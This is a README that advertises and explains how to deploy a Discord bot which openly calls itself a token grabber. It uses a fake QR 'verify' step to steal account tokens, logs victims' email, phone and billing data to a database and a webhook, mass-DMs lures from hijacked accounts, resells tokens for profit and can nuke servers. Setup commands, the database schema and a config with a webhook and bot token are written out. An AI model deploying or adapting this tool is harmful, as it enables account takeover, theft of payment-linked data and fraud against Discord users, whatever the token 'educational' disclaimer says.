# QR-VERIFY-BOT
Discord Bot that is a token grabber

## Contact

Discord : HOTROD#5528

Telegram : @HOTRODEU


## **Features** :
- Automatic token logger (QR code scanner that will grab token of scanner )
- Discord config saver (make one discord server and u can load the config to any other server and it automatically will create all channels and roles)
- Build in massDM (will dm any message to every token that gets logged where valid_payment=false)
- Token Sorter (Will sort ur tokens in things like : billing = true or false, nitro active = t or f, Guilds = #Number, Relationships = #Number)
- All tokens that u get can get logged into an Discord server that u own, ill send a screenshot about this with further explanation.
- Runs 24/7 on database where u can look for tokens. 
    For example : select token from tokens where valid_payment=true; 
    (this will give u an output with all of the tokens that have valid_payment = true, or in other words that have a payment method connected)
- Extra money making method that i cant say without u buying (with 4 active 3k servers u get around 25$/day passively)
- Nitro distributing function in ur private server where y person can pay u and it will automatically send x amount of tokens to y person
- All ran on VPS that is free, for 2 months that i can show u. 24/7 active

## Disclaimer 
 The automation of User Discord accounts also known as self-bots is a violation of Discord Terms of Service & Community guidelines and will result in your account(s) being terminated. Discretion is adviced. I will not be responsible for your actions. Read about Discord [Terms Of service](https://discord.com/terms) and [Community Guidelines](https://discord.com/guidelines)
 
This bot was written to for educational purposes, to prove that discord has flaws and that people with malicious contents could easily manipulate people into giving their token away. 

## Setup Bot and VPS

#### IN VPS (install required software)
    - root/ (sudo) apt update
    - root/ (sudo) apt install python3
    - root/ (sudo) apt install python3-pip
    - root/ pip install -r requirements.txt
#### IN VPS (create database)
    - root/ sudo apt update
    - sudo apt install postgresql postgresql-contrib
    - sudo systemctl start postgresql.service
    - sudo -u postgres createuser --interactive --pwprompt
    - give name, password and type Y when asked
    - sudo -u postgres psql
    - create database disq
    - \c disq
    - ;
    CREATE TABLE tokens (
        id SERIAL PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        userid VARCHAR(255) NOT NULL,
        token VARCHAR(255) NOT NULL,
        email VARCHAR(255),
        phone VARCHAR(255),
        mfa boolean NOT NULL,
        nitro boolean NOT NULL,
        billing json,
        valid_payment boolean
    );
    - (paste entire "CREATE TABLE tokens" part and ENTER)
    - UR DONE 
   
   ##### Database

```python

    #postgres://user:password@host:port/database?option=value
    dsn = 'postgres://harry:1234@127.0.0.1:5432/disq'

```

    - all u need to edit here is name and password to the name and pw u gave in ur database #### IN VPS (create database)

-------------------------------------------------------------------------------------------------------------
    
    
    
#### IN VPS (START BOT)
    - (to exit database) 
    - \q
    - cd HOTROD-QR-VERIFY-BOT
    - screen "ENTER" (press any button to get out of confirmscreen)
    - (press following buttons in this order) (^ = control)
    - ^a :sessionname HOTROD-QR-VERIFY-BOT "ENTER"
    - (if u are in root directory still do "cd HOTROD-QR-VERIFY-BOT" again, if not go to next step)
    - vim database.py
    - press "i" to go into insertmode
    - change the name and password to what u gave the user when creating database.
    - press "escape" to go out of insertmode
    - press ":" and type "wq" and press "ENTER"
    - ( run ) python3 main.py 
    - ( bot should be running ) 
    - ( ^a ^d to detach from screen ) 
    - ( type screen -ls for list of all screens )
    - ( to reattach to screen type screen -r HOTROD-QR-VERIFY-BOT "ENTER" )
    - U ARE FINISHED BOT IS RUNNING 


#### DISCORD DEVELOPER (BOT SETUP)
    - SECRET
    - SECRET
    - SECRET
    - SECRET

#### IN VPS (CONFIG ADJUSTMENT)
    - detached from screen do following commands
    - cd HOTROD-QR-VERIFY-BOT
    - vim config.json
    - press "i" to go into insertmode
    - go to bot_token and using arrow keys go to any letter in between the ""
    - press "d" "i" """
    - press "i" 
    - ^shift V or command V on mac to paste the bot token in between the ""
    - press escape 
    - :wq (at bottom of the terminal)
    - screen -r HOTROD-QR-VERIFY-BOT
    - ^c (abort bot to restart it with new config )
    - python3 main.py

#### DISCORD (SERVER SETUP)
    - SECRET


    
    
    
## How to get help? 
Read this documentation, try using `Ctrl + F` to find what you're looking for. Message me on discord or telegram if u cannot find it in here.

## Config

```json
{
    "bot_prefix": "!",
    "tokens_logged": 0,
    "webhook_url": "https://discord.com/api/webhooks/1003754595677380628/eAO4Y0Ze9RtMgSeDAJqX9WKyipmk0LGPt5gkgob5-",
    "bot_token": "MTAwNjg2MDUwNjc4MDQxODEwOA.G8eM6U.jgy7hMap",
    "auto_add": {
        "enabled": true,
        "users": []
    },
    "auto_spread": {
        "enabled": true,
        "messages": [
            "https://discord.gg/jevVxqtphT"
        ]
    },
    "servers": { }
       
    
}
```
| Name | Description | 
| --- | ---         |
| `bot_prefix` | Prefix used before every command in the discord server |
| `tokens_logged` | Amount of tokens logged since startup |
| `webhook_url` | Webhook URL that leads to the integration of the webhook u have in ur private server, this is where all the tokens get logged |
| `bot_token` | Token of the bot that u have created |
| `auto_add` | Will automatically add users that are written here ( IDs ) |
| `auto_spread` | When "enabled=true" bot will massDM the message in "messages" to everyone in the friends list and in every guild channel the owner of the account is in |
| `servers` | Automatic function where all servers will be shown that have the bot active and have a verified role |

## Discord Server Commands

### GuildManager

| Name | Type | Description | 
| ---  | ---  | ---         |
| `loadconfig` | GuildManager | Loads config from the source files, when no config available under x name, it will nuke server.
| `saveconfig` | GuildManager | Saves current state of discord server (all channels, channel names, permissions, lastmessage send per channel).

### NukeCog
| Name | Type | Description | 
| ---  | ---  | ---         |
| `nuke` | NukeCog | Nukes server, removes everything.

### Verification
| Name | Type | Description | 
| ---  | ---  | ---         |
| `addfriend` | Verification | adds x as friend on the account the bot is massDMing with.
| `addmessage` | Verification | adds x as message to massDM spreader.
| `changetokenwebhook ` | Verification | Changes webhookurl to given message.
| `deletefriend` | Verification | removes x as friend on the account the bot is massDMing with.
| `deletemessage` | Verification | GUI to remove single message from the messages.
| `giverole` | Verification | gives x role to urself.
| `listfriends` | Verification | lists friends.
| `listmessages` | Verification | gives a list of all messages that are being send by the massDMer.
| `setuppanel` | Verification | setup in channel panel that has verify button that gives a qr code.
| `setuprole` | Verification | GUI that lets u choose what role people get after succesfully verifying.
| `togglespreader` | Verification | turns massDMer on or off.

-------------------------------------------------------------------------------------------------------------
